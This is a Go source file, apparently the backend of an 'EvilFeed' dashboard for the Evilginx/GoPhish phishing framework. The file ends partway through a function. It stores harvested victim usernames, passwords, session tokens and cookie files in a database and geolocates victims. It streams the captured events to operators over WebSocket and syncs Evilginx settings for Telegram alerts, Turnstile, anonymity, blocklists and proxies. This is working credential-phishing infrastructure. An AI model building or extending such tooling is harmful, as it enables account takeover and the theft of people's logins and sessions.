package main

import (
	"bytes"
	"crypto/rand"
	"crypto/sha256"
	"crypto/tls"
	"database/sql"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/big"
	"net"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
	_ "github.com/mattn/go-sqlite3"
	"github.com/oschwald/geoip2-golang"
	"golang.org/x/crypto/bcrypt"
)

// evilginxClient is a shared HTTP client for communicating with Evilginx internal API
// Now uses plain HTTP for internal API (port 8888) - no TLS needed for localhost
// Falls back to HTTPS for legacy compatibility
var evilginxClient = &http.Client{
	Timeout: 15 * time.Second,
	Transport: &http.Transport{
		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:        10,
		IdleConnTimeout:     30 * time.Second,
		DisableKeepAlives:   false,
		MaxIdleConnsPerHost: 5,
	},
}

// evilginxAPIAvailable tracks if Evilginx API is reachable
var evilginxAPIAvailable = false
var evilginxAPILastCheck = time.Time{}
var evilginxInternalAPIPort = "" // Internal HTTP API port (default: 8888)
var evilginxInternalAPIChecked = false
var evilginxUseHTTP = true // Use HTTP for internal API (new default)

// getEvilginxInternalAPIPort returns the port for Evilginx's internal HTTP API
// This is the new HTTP-only API on port 8888 (no TLS)
func getEvilginxInternalAPIPort() string {
	// Return cached value if already detected
	if evilginxInternalAPIChecked && evilginxInternalAPIPort != "" {
		return evilginxInternalAPIPort
	}

	// 1. Check environment variable (manual override)
	if port := os.Getenv("EVILGINX_INTERNAL_API_PORT"); port != "" {
		evilginxInternalAPIPort = port
		evilginxInternalAPIChecked = true
		log.Printf("[EvilginxAPI] Using internal API port %s from env var", port)
		return port
	}

	// 2. Check marker file created by start.sh
	home, _ := os.UserHomeDir()
	markerFile := filepath.Join(home, ".evilgophish", "internal_api_port")
	if data, err := os.ReadFile(markerFile); err == nil {
		port := strings.TrimSpace(string(data))
		if port != "" {
			evilginxInternalAPIPort = port
			evilginxInternalAPIChecked = true
			log.Printf("[EvilginxAPI] Using internal API port %s from marker file", port)
			return port
		}
	}

	// 3. Try internal HTTP API port 8888 first (new default)
	conn, err := net.DialTimeout("tcp", "127.0.0.1:8888", 1*time.Second)
	if err == nil {
		conn.Close()
		evilginxInternalAPIPort = "8888"
		evilginxInternalAPIChecked = true
		evilginxUseHTTP = true
		log.Printf("[EvilginxAPI] Internal HTTP API available on port 8888")
		return "8888"
	}

	// 4. Fallback: Try legacy HTTPS ports (8443, 443)
	for _, port := range []string{"8443", "443"} {
		conn, err := net.DialTimeout("tcp", "127.0.0.1:"+port, 1*time.Second)
		if err == nil {
			conn.Close()
			evilginxInternalAPIPort = port
			evilginxInternalAPIChecked = true
			evilginxUseHTTP = false // Use HTTPS for legacy ports
			log.Printf("[EvilginxAPI] Fallback to HTTPS port %s (internal HTTP API not available)", port)
			return port
		}
	}

	// Default to 8888 (internal HTTP API)
	evilginxInternalAPIPort = "8888"
	evilginxInternalAPIChecked = true
	evilginxUseHTTP = true
	return "8888"
}

// getEvilginxAPIURL returns the full URL for Evilginx internal API
// Uses HTTP for port 8888 (internal API), HTTPS for legacy ports
func getEvilginxAPIURL(path string) string {
	port := getEvilginxInternalAPIPort()
	if evilginxUseHTTP || port == "8888" {
		return fmt.Sprintf("http://127.0.0.1:%s%s", port, path)
	}
	// Legacy HTTPS fallback
	return fmt.Sprintf("https://127.0.0.1:%s%s", port, path)
}

var db *sql.DB
var geoDB *geoip2.Reader
var globalHub *Hub

// Auth & Captcha Stores
var (
	captchaStore  = make(map[string]captchaEntry)
	captchaMutex  sync.RWMutex
	sessionStore  = make(map[string]sessionInfo)
	sessionMutex  sync.RWMutex
	loginAttempts = make(map[string]*attemptInfo)
	attemptMutex  sync.Mutex
)

type sessionInfo struct {
	Expires time.Time
}

type captchaEntry struct {
	Answer  int
	Expires time.Time
}

type attemptInfo struct {
	Count       int
	LockedUntil time.Time
}

var upgrader = websocket.Upgrader{
	ReadBufferSize:  1024,
	WriteBufferSize: 1024,
	CheckOrigin: func(r *http.Request) bool {
		return true // Allow all origins
	},
}

const (
	writeWait      = 300 * time.Second
	pongWait       = 300 * time.Second
	pingPeriod     = (pongWait * 9) / 10
	maxMessageSize = 1000000
)

var (
	newline = []byte{'\n'}
	space   = []byte{' '}
)

// --- WebSocket Client ---

func (c *Client) writePump() {
	ticker := time.NewTicker(pingPeriod)
	defer func() {
		ticker.Stop()
		c.conn.Close()
	}()
	for {
		select {
		case message, ok := <-c.send:
			c.conn.SetWriteDeadline(time.Now().Add(writeWait))
			if !ok {
				c.conn.WriteMessage(websocket.CloseMessage, []byte{})
				return
			}

			w, err := c.conn.NextWriter(websocket.TextMessage)
			if err != nil {
				return
			}
			w.Write(message)

			n := len(c.send)
			for i := 0; i < n; i++ {
				w.Write(newline)
				w.Write(<-c.send)
			}

			if err := w.Close(); err != nil {
				return
			}
		case <-ticker.C:
			c.conn.SetWriteDeadline(time.Now().Add(writeWait))
			if err := c.conn.WriteMessage(websocket.PingMessage, nil); err != nil {
				return
			}
		}
	}
}

func (c *Client) readPump() {
	defer func() {
		c.hub.unregister <- c
		c.conn.Close()
	}()
	c.conn.SetReadLimit(maxMessageSize)
	c.conn.SetReadDeadline(time.Now().Add(pongWait))
	c.conn.SetPongHandler(func(string) error { c.conn.SetReadDeadline(time.Now().Add(pongWait)); return nil })
	for {
		_, message, err := c.conn.ReadMessage()
		if err != nil {
			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
				log.Printf("error: %v", err)
			}
			break
		}
		message = bytes.TrimSpace(bytes.Replace(message, newline, space, -1))
		saveEvent(message)
		c.hub.broadcast <- message
	}
}

func serveWs(hub *Hub, w http.ResponseWriter, r *http.Request) {
	// Check auth for WS too
	cookie, err := r.Cookie("session_token")
	if err != nil || !isValidSession(cookie.Value) {
		http.Error(w, "Unauthorized", http.StatusUnauthorized)
		return
	}

	c, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Print("upgrade:", err)
		return
	}
	client := &Client{hub: hub, conn: c, send: make(chan []byte, 256)}
	client.hub.register <- client

	go client.writePump()
	go client.readPump()
}

// --- Data Models ---

type GeoInfo struct {
	City    string  `json:"city"`
	Country string  `json:"country"`
	Lat     float64 `json:"lat"`
	Lon     float64 `json:"lon"`
}

type Event struct {
	ID         int64   `json:"id"`
	Timestamp  int64   `json:"timestamp"`
	Type       string  `json:"type"`
	Phishlet   string  `json:"phishlet"`
	IP         string  `json:"ip"`
	Username   string  `json:"username,omitempty"`
	Password   string  `json:"password,omitempty"`
	SessionID  string  `json:"session_id,omitempty"`
	Tokens     string  `json:"tokens,omitempty"`
	CookieFile string  `json:"cookie_file,omitempty"` // Path to exported cookie file
	Geo        GeoInfo `json:"geo,omitempty"`
	Score      int     `json:"score,omitempty"`
	Message    string  `json:"message,omitempty"`
	RID        string  `json:"rid,omitempty"` // GoPhish Recipient ID for campaign tracking
}

// IP-API response structure for geo lookup fallback
type IPAPIResponse struct {
	Status  string  `json:"status"`
	Country string  `json:"country"`
	City    string  `json:"city"`
	Lat     float64 `json:"lat"`
	Lon     float64 `json:"lon"`
	Message string  `json:"message,omitempty"`
}

// ipAPICache stores recent IP lookups to avoid hitting rate limits
var ipAPICache = make(map[string]*GeoInfo)
var ipAPICacheMutex sync.RWMutex
var ipAPILastRequest time.Time
var ipAPIMutex sync.Mutex

// lookupGeoIP tries MaxMind first, then falls back to IP-API
func lookupGeoIP(ip string) *GeoInfo {
	if ip == "" {
		return nil
	}

	parsed := net.ParseIP(ip)
	if parsed == nil {
		return nil
	}

	// Skip private/local IPs
	if parsed.IsPrivate() || parsed.IsLoopback() || parsed.IsLinkLocalUnicast() {
		return nil
	}

	// Try MaxMind first (fastest, no rate limits)
	if geoDB != nil {
		record, err := geoDB.City(parsed)
		if err == nil && record != nil {
			geo := &GeoInfo{
				City:    record.City.Names["en"],
				Country: record.Country.Names["en"],
				Lat:     record.Location.Latitude,
				Lon:     record.Location.Longitude,
			}
			if len(record.Subdivisions) > 0 && geo.City == "" {
				geo.City = record.Subdivisions[0].Names["en"]
			}
			if geo.Lat != 0 || geo.Lon != 0 {
				return geo
			}
		}
	}

	// Fallback to IP-API (free, 45 requests/minute limit)
	return lookupIPAPI(ip)
}

// lookupIPAPI queries ip-api.com for geo data (with caching and rate limiting)
func lookupIPAPI(ip string) *GeoInfo {
	// Check cache first
	ipAPICacheMutex.RLock()
	if cached, ok := ipAPICache[ip]; ok {
		ipAPICacheMutex.RUnlock()
		return cached
	}
	ipAPICacheMutex.RUnlock()

	// Rate limit: max 45 requests per minute (one every 1.3 seconds to be safe)
	ipAPIMutex.Lock()
	elapsed := time.Since(ipAPILastRequest)
	if elapsed < 1500*time.Millisecond {
		ipAPIMutex.Unlock()
		return nil // Skip this lookup to avoid rate limiting
	}
	ipAPILastRequest = time.Now()
	ipAPIMutex.Unlock()

	// Make API request
	client := &http.Client{Timeout: 3 * time.Second}
	resp, err := client.Get(fmt.Sprintf("http://ip-api.com/json/%s?fields=status,country,city,lat,lon,message", ip))
	if err != nil {
		return nil
	}
	defer resp.Body.Close()

	var result IPAPIResponse
	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return nil
	}

	if result.Status != "success" {
		return nil
	}

	geo := &GeoInfo{
		City:    result.City,
		Country: result.Country,
		Lat:     result.Lat,
		Lon:     result.Lon,
	}

	// Cache the result
	ipAPICacheMutex.Lock()
	ipAPICache[ip] = geo
	// Limit cache size to 1000 entries
	if len(ipAPICache) > 1000 {
		// Clear oldest entries (simple approach: clear all)
		ipAPICache = make(map[string]*GeoInfo)
		ipAPICache[ip] = geo
	}
	ipAPICacheMutex.Unlock()

	return geo
}

// --- Database & Auth ---

func initDB() {
	home, _ := os.UserHomeDir()
	dbPath := filepath.Join(home, ".evilgophish", "nexusfeed.db")
	os.MkdirAll(filepath.Dir(dbPath), 0755)

	var err error
	db, err = sql.Open("sqlite3", dbPath)
	if err != nil {
		log.Fatal(err)
	}

	_, err = db.Exec(`
		CREATE TABLE IF NOT EXISTS events (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			timestamp INTEGER,
			type TEXT,
			phishlet TEXT,
			ip TEXT,
			username TEXT,
			password TEXT,
			session_id TEXT,
			tokens TEXT,
			geo_city TEXT,
			geo_country TEXT,
			geo_lat REAL,
			geo_lon REAL,
			score INTEGER,
			message TEXT,
			rid TEXT
		);
		CREATE INDEX IF NOT EXISTS idx_events_dedup ON events(type, ip, phishlet, username, timestamp);
		CREATE INDEX IF NOT EXISTS idx_events_type_time ON events(type, timestamp);
		CREATE INDEX IF NOT EXISTS idx_events_rid ON events(rid);
		CREATE TABLE IF NOT EXISTS admin (
			id INTEGER PRIMARY KEY AUTOINCREMENT,
			password_hash TEXT,
			must_reset INTEGER
		);
		CREATE TABLE IF NOT EXISTS settings (
			key TEXT PRIMARY KEY,
			value TEXT
		);
		CREATE TABLE IF NOT EXISTS seen_visitors (
			ip TEXT PRIMARY KEY,
			first_seen INTEGER,
			last_seen INTEGER,
			visit_count INTEGER DEFAULT 1
		);
	`)
	if err != nil {
		log.Fatal(err)
	}
	// Add rid column if it doesn't exist (migration for existing databases)
	// Ignore error since column may already exist
	_, _ = db.Exec("ALTER TABLE events ADD COLUMN rid TEXT")

	// Try to load GeoIP database from multiple locations
	geoPath := os.Getenv("EVILFEED_GEOIP_PATH")
	geoPaths := []string{
		geoPath,                // Environment variable (highest priority)
		"GeoLite2-City.mmdb",   // Current directory
		"./GeoLite2-City.mmdb", // Explicit current directory
		filepath.Join(filepath.Dir(os.Args[0]), "GeoLite2-City.mmdb"), // Same dir as binary
		"/opt/evilfeed/GeoLite2-City.mmdb",                            // System location
	}

	for _, path := range geoPaths {
		if path == "" {
			continue
		}
		if _, err := os.Stat(path); err == nil {
			geo, err := geoip2.Open(path)
			if err != nil {
				log.Printf("geoip: failed to open %s: %v", path, err)
			} else {
				geoDB = geo
				log.Printf("geoip: loaded database from %s", path)
				break
			}
		}
	}

	if geoDB == nil {
		log.Printf("geoip: no local database found, will use IP-API fallback for geo lookups")
	}
}

func getSetting(key string, def string) string {
	var v string
	if err := db.QueryRow("SELECT value FROM settings WHERE key = ?", key).Scan(&v); err == nil {
		if strings.TrimSpace(v) != "" {
			return v
		}
	}
	return def
}

// TelegramConfig represents the Telegram configuration from Evilginx
type TelegramConfig struct {
	BotToken string `json:"bot_token"`
	ChatId   string `json:"chat_id"`
	Enabled  bool   `json:"enabled"`
}

// checkEvilginxAPI checks if Evilginx API is available
// Only checks once per 30 seconds to avoid excessive connection attempts
func checkEvilginxAPI() bool {
	if time.Since(evilginxAPILastCheck) < 30*time.Second {
		return evilginxAPIAvailable
	}
	evilginxAPILastCheck = time.Now()

	// Quick TCP check to see if the auto-detected port is open
	port := getEvilginxInternalAPIPort()
	conn, err := net.DialTimeout("tcp", "127.0.0.1:"+port, 2*time.Second)
	if err != nil {
		evilginxAPIAvailable = false
		return false
	}
	conn.Close()
	evilginxAPIAvailable = true
	return true
}

// fetchTelegramConfig fetches Telegram config from Evilginx
func fetchTelegramConfig() *TelegramConfig {
	if !checkEvilginxAPI() {
		// Silently return empty config if Evilginx API not available
		return &TelegramConfig{}
	}

	resp, err := evilginxClient.Get(getEvilginxAPIURL("/_telegram/config"))
	if err != nil {
		log.Printf("Failed to fetch Telegram config from Evilginx: %v", err)
		return &TelegramConfig{}
	}
	defer resp.Body.Close()

	var cfg TelegramConfig
	if err := json.NewDecoder(resp.Body).Decode(&cfg); err != nil {
		log.Printf("Failed to decode Telegram config: %v", err)
		return &TelegramConfig{}
	}
	return &cfg
}

// updateTelegramConfig sends Telegram config update to Evilginx
func updateTelegramConfig(botToken, chatId string) error {
	payload := map[string]string{
		"bot_token": botToken,
		"chat_id":   chatId,
	}
	data, _ := json.Marshal(payload)

	resp, err := evilginxClient.Post(getEvilginxAPIURL("/_telegram/config"), "application/json", bytes.NewBuffer(data))
	if err != nil {
		return fmt.Errorf("failed to update Telegram config: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("Evilginx returned status %d", resp.StatusCode)
	}
	return nil
}

// TurnstileConfig represents the Turnstile configuration from Evilginx
type TurnstileConfig struct {
	SiteKey   string `json:"sitekey"`
	SecretKey string `json:"secretkey"`
	Enabled   bool   `json:"enabled"`
}

// fetchTurnstileConfig fetches Turnstile config from Evilginx
func fetchTurnstileConfig() *TurnstileConfig {
	if !checkEvilginxAPI() {
		return &TurnstileConfig{}
	}

	resp, err := evilginxClient.Get(getEvilginxAPIURL("/_turnstile/config"))
	if err != nil {
		log.Printf("Failed to fetch Turnstile config from Evilginx: %v", err)
		return &TurnstileConfig{}
	}
	defer resp.Body.Close()

	var cfg TurnstileConfig
	if err := json.NewDecoder(resp.Body).Decode(&cfg); err != nil {
		log.Printf("Failed to decode Turnstile config: %v", err)
		return &TurnstileConfig{}
	}
	return &cfg
}

// updateTurnstileConfig sends Turnstile config update to Evilginx
func updateTurnstileConfig(sitekey, secretkey string, enabled *bool) error {
	payload := map[string]interface{}{}
	if sitekey != "" {
		payload["sitekey"] = sitekey
	}
	if secretkey != "" {
		payload["secretkey"] = secretkey
	}
	if enabled != nil {
		payload["enabled"] = *enabled
	}
	data, _ := json.Marshal(payload)

	resp, err := evilginxClient.Post(getEvilginxAPIURL("/_turnstile/config"), "application/json", bytes.NewBuffer(data))
	if err != nil {
		return fmt.Errorf("failed to update Turnstile config: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("Evilginx returned status %d", resp.StatusCode)
	}
	return nil
}

// handleTurnstileSync handles GET requests to fetch Turnstile config from Evilginx
func handleTurnstileSync(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	if !checkEvilginxAPI() {
		http.Error(w, "Evilginx API unavailable or offline", http.StatusServiceUnavailable)
		return
	}

	cfg := fetchTurnstileConfig()
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"site_key":   cfg.SiteKey,
		"secret_key": cfg.SecretKey,
		"enabled":    cfg.Enabled,
	})
}

// handleTurnstilePush handles POST requests to push Turnstile config to Evilginx
func handleTurnstilePush(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	if !checkEvilginxAPI() {
		http.Error(w, "Evilginx API unavailable or offline", http.StatusServiceUnavailable)
		return
	}

	var req struct {
		SiteKey   string `json:"site_key"`
		SecretKey string `json:"secret_key"`
		Enabled   *bool  `json:"enabled"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid request body", http.StatusBadRequest)
		return
	}

	if err := updateTurnstileConfig(req.SiteKey, req.SecretKey, req.Enabled); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
}

// handleTelegramSync handles GET requests to fetch Telegram config from Evilginx
func handleTelegramSync(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	if !checkEvilginxAPI() {
		http.Error(w, "Evilginx API unavailable or offline", http.StatusServiceUnavailable)
		return
	}

	cfg := fetchTelegramConfig()
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"bot_token": cfg.BotToken,
		"chat_id":   cfg.ChatId,
		"enabled":   cfg.Enabled,
	})
}

// handleTelegramPush handles POST requests to push Telegram config to Evilginx
func handleTelegramPush(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	if !checkEvilginxAPI() {
		http.Error(w, "Evilginx API unavailable or offline", http.StatusServiceUnavailable)
		return
	}

	var req struct {
		BotToken string `json:"bot_token"`
		ChatID   string `json:"chat_id"`
		Enabled  *bool  `json:"enabled"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid request body", http.StatusBadRequest)
		return
	}

	if err := pushTelegramConfig(req.BotToken, req.ChatID, req.Enabled); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
}

// pushTelegramConfig pushes Telegram config to Evilginx with enabled support
func pushTelegramConfig(botToken string, chatID string, enabled *bool) error {
	payload := map[string]interface{}{}
	if botToken != "" {
		payload["bot_token"] = botToken
	}
	if chatID != "" {
		payload["chat_id"] = chatID
	}
	if enabled != nil {
		payload["enabled"] = *enabled
	}

	data, err := json.Marshal(payload)
	if err != nil {
		return err
	}

	resp, err := evilginxClient.Post(getEvilginxAPIURL("/_telegram/config"), "application/json", bytes.NewReader(data))
	if err != nil {
		return fmt.Errorf("failed to push Telegram config: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("evilginx returned %d: %s", resp.StatusCode, string(body))
	}
	return nil
}

// handleAnonymitySync handles GET requests to fetch Anonymity config from Evilginx
func handleAnonymitySync(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if !checkEvilginxAPI() {
		http.Error(w, "Evilginx API unavailable or offline", http.StatusServiceUnavailable)
		return
	}
	resp, err := evilginxClient.Get(getEvilginxAPIURL("/_anonymity/config"))
	if err != nil {
		http.Error(w, "Failed to fetch config", http.StatusInternalServerError)
		return
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	w.Header().Set("Content-Type", "application/json")
	w.Write(body)
}

// handleAnonymityPush handles POST requests to push Anonymity config to Evilginx
func handleAnonymityPush(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if !checkEvilginxAPI() {
		http.Error(w, "Evilginx API unavailable or offline", http.StatusServiceUnavailable)
		return
	}
	body, _ := io.ReadAll(r.Body)
	resp, err := evilginxClient.Post(getEvilginxAPIURL("/_anonymity/config"), "application/json", bytes.NewReader(body))
	if err != nil {
		http.Error(w, "Failed to push config", http.StatusInternalServerError)
		return
	}
	defer resp.Body.Close()
	respBody, _ := io.ReadAll(resp.Body)
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(resp.StatusCode)
	w.Write(respBody)
}

// handleCloudflareSync handles GET requests to fetch Cloudflare config from Evilginx
func handleCloudflareSync(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if !checkEvilginxAPI() {
		http.Error(w, "Evilginx API unavailable or offline", http.StatusServiceUnavailable)
		return
	}
	resp, err := evilginxClient.Get(getEvilginxAPIURL("/_cloudflare/config"))
	if err != nil {
		http.Error(w, "Failed to fetch config", http.StatusInternalServerError)
		return
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	w.Header().Set("Content-Type", "application/json")
	w.Write(body)
}

// handleCloudflarePush handles POST requests to push Cloudflare config to Evilginx
func handleCloudflarePush(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if !checkEvilginxAPI() {
		http.Error(w, "Evilginx API unavailable or offline", http.StatusServiceUnavailable)
		return
	}
	body, _ := io.ReadAll(r.Body)
	resp, err := evilginxClient.Post(getEvilginxAPIURL("/_cloudflare/config"), "application/json", bytes.NewReader(body))
	if err != nil {
		http.Error(w, "Failed to push config", http.StatusInternalServerError)
		return
	}
	defer resp.Body.Close()
	respBody, _ := io.ReadAll(resp.Body)
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(resp.StatusCode)
	w.Write(respBody)
}

// handleBlocklistSync handles GET requests to fetch Blocklist config from Evilginx
func handleBlocklistSync(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if !checkEvilginxAPI() {
		http.Error(w, "Evilginx API unavailable or offline", http.StatusServiceUnavailable)
		return
	}
	resp, err := evilginxClient.Get(getEvilginxAPIURL("/_blocklist/config"))
	if err != nil {
		http.Error(w, "Failed to fetch config", http.StatusInternalServerError)
		return
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	w.Header().Set("Content-Type", "application/json")
	w.Write(body)
}

// handleBlocklistPush handles POST requests to push Blocklist config to Evilginx
func handleBlocklistPush(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	if !checkEvilginxAPI() {
		http.Error(w, "Evilginx API unavailable or offline", http.StatusServiceUnavailable)
		return
	}
	body, _ := io.ReadAll(r.Body)
	resp, err := evilginxClient.Post(getEvilginxAPIURL("/_blocklist/config"), "application/json", bytes.NewReader(body))
	if err != nil {
		http.Error(w, "Failed to push config", http.StatusInternalServerError)
		return
	}
	defer resp.Body.Close()
	respBody, _ := io.ReadAll(resp.Body)
	w.Header().Set("Content-Type", "application/json")
	w.WriteHeader(resp.StatusCode)
	w.Write(respBody)
}

// handleProxySync handles GET requests to fetch Proxy config from Evilginx
func handleProxySync(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodGet {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	if !checkEvilginxAPI() {
		http.Error(w, "Evilginx API unavailable or offline", http.StatusServiceUnavailable)
		return
	}

	cfg := fetchProxyConfig()
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"type":     cfg.Type,
		"address":  cfg.Address,
		"port":     cfg.Port,
		"username": cfg.Username,
		"enabled":  cfg.Enabled,
	})
}

// handleProxyPush handles POST requests to push Proxy config to Evilginx
func handleProxyPush(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}

	if !checkEvilginxAPI() {
		http.Error(w, "Evilginx API unavailable or offline", http.StatusServiceUnavailable)
		return
	}

	var req ProxyConfig
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid request body", http.StatusBadRequest)
		return
	}

	if err := updateProxyConfig(&req); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
}

// ProxyConfig represents the Proxy configuration from Evilginx
type ProxyConfig struct {
	Type     string `json:"type"`
	Address  string `json:"address"`
	Port     int    `json:"port"`
	Username string `json:"username"`
	Password string `json:"password"`
	Enabled  bool   `json:"enabled"`
}

// fetchProxyConfig fetches Proxy config from Evilginx
func fetchProxyConfig() *ProxyConfig {
	if !checkEvilginxAPI() {
		return &ProxyConfig{Type: "socks5"}
	}

	resp, err := evilginxClient.Get(getEvilginxAPIURL("/_proxy/config"))
	if err != nil {
		log.Printf("Failed to fetch Proxy config from Evilginx: %v", err)
		return &ProxyConfig{Type: "socks5"}
	}
	defer resp.Body.Close()

	var cfg ProxyConfig
	if err := json.NewDecoder(resp.Body).Decode(&cfg); err != nil {
		log.Printf("Failed to decode Proxy config: %v", err)
		return &ProxyConfig{Type: "socks5"}
	}
	if cfg.Type == "" {
		cfg.Type = "socks5"
	}
	return &cfg
}

// updateProxyConfig sends Proxy config update to Evilginx and applies immediately
func updateProxyConfig(cfg *ProxyConfig) error {
	payload := map[string]interface{}{}
	if cfg.Type != "" {
		payload["type"] = cfg.Type
	}
	if cfg.Address != "" {
		payload["address"] = cfg.Address
	}
	if cfg.Port > 0 {
		payload["port"] = cfg.Port
	}
	if cfg.Username != "" {
		payload["username"] = cfg.Username
	}
	if cfg.Password != "" {
		payload["password"] = cfg.Password
	}
	payload["enabled"] = cfg.Enabled

	data, _ := json.Marshal(payload)

	resp, err := evilginxClient.Post(getEvilginxAPIURL("/_proxy/config"), "application/json", bytes.NewBuffer(data))
	if err != nil {
		return fmt.Errorf("failed to update Proxy config: %v", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("Evilginx returned status %d: %s", resp.StatusCode, string(body))
	}
	return nil
}

func initAuth() {
	var count int
	err := db.QueryRow("SELECT COUNT(*) FROM admin").Scan(&count)
	if err != nil {
		log.Fatal(err)
	}

	if count == 0 {
		// Generate initial password and store it (plaintext) for display until changed
		password := generateRandomString(12)
		hash := hashPassword(password)

		_, err := db.Exec("INSERT INTO admin (password_hash, must_reset) VALUES (?, 1)", hash)
		if err != nil {
			log.Fatal(err)
		}

		// Store the plaintext password in settings for display until user changes it
		_, _ = db.Exec("INSERT OR REPLACE INTO settings (key, value) VALUES ('initial_password', ?)", password)
	}

	// Always check if password needs to be displayed (must_reset = 1 means user hasn't changed it)
	var mustReset int
	err = db.QueryRow("SELECT must_reset FROM admin LIMIT 1").Scan(&mustReset)
	if err == nil && mustReset == 1 {
		// Get the stored initial password
		var initialPassword string
		err = db.QueryRow("SELECT value FROM settings WHERE key = 'initial_password'").Scan(&initialPassword)
		if err == nil && initialPassword != "" {
			fmt.Println()
			fmt.Println("\033[1;33m╔══════════════════════════════════════════════════════════════╗\033[0m")
			fmt.Println("\033[1;33m║              EVILFEED DASHBOARD CREDENTIALS                  ║\033[0m")
			fmt.Println("\033[1;33m╠══════════════════════════════════════════════════════════════╣\033[0m")
			fmt.Println("\033[1;33m║\033[0m  Username: \033[1;32madmin\033[0m                                            \033[1;33m║\033[0m")
			fmt.Printf("\033[1;33m║\033[0m  Password: \033[1;32m%-40s\033[0m      \033[1;33m║\033[0m\n", initialPassword)
			fmt.Println("\033[1;33m╠══════════════════════════════════════════════════════════════╣\033[0m")
			fmt.Println("\033[1;33m║\033[0m  \033[1;31m⚠ Change this password after first login!\033[0m                 \033[1;33m║\033[0m")
			fmt.Println("\033[1;33m╚══════════════════════════════════════════════════════════════╝\033[0m")
			fmt.Println()
		}
	} else {
		// Password has been changed, remove the stored initial password
		_, _ = db.Exec("DELETE FROM settings WHERE key = 'initial_password'")
	}
}

func generateRandomString(n int) string {
	const letters = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
	ret := make([]byte, n)
	for i := 0; i < n; i++ {
		num, err := rand.Int(rand.Reader, big.NewInt(int64(len(letters))))
		if err != nil {
			return ""
		}
		ret[i] = letters[num.Int64()]
	}
	return string(ret)
}

func hashPassword(password string) string {
	hash, err := bcrypt.GenerateFromPassword([]byte(password), bcrypt.DefaultCost)
	if err != nil {
		return ""
	}
	return string(hash)
}

func checkPassword(hash string, password string) bool {
	if bcrypt.CompareHashAndPassword([]byte(hash), []byte(password)) == nil {
		return true
	}
	// Backward compatibility: accept legacy sha256 hex hashes
	if len(hash) == 64 {
		legacy := sha256.Sum256([]byte(password))
		if hex.EncodeToString(legacy[:]) == hash {
			return true
		}
	}
	return false
}

func isValidSession(token string) bool {
	sessionMutex.RLock()
	defer sessionMutex.RUnlock()
	info, ok := sessionStore[token]
	if !ok {
		return false
	}
	if time.Now().After(info.Expires) {
		return false
	}
	return true
}

// --- Handlers ---

func saveEvent(msg []byte) {
	var e Event
